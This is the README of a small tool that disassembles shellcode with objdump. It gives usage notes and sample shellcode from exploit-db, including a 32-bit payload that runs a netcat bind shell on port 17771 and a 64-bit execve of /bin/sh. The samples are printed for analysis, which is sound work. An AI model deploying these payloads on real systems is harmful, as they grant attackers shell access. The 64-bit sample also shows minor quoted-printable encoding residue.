# shellconv
Small tool for disassembling shellcode (using objdump)<br/>
<pre>
Use: ./shellconv.py [inFile] [arch:optional] [outFile:optional]
arch: defined as in objdump -m, default: i386
</pre>
examples:
-
1) https://www.exploit-db.com/exploits/36921/<br/>
expdb1.shc :
<pre>
"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";
</pre>
![](http://hasherezade.net/misc/pics/shellconv/edb1.png)
<br/>
expdb1_64.shc :
<pre>
  char *shellcode =3D "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56=
\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";
</pre>
2) https://www.exploit-db.com/exploits/36858/<br/>
![](http://hasherezade.net/misc/pics/shellconv/edb2.png)
<br/>
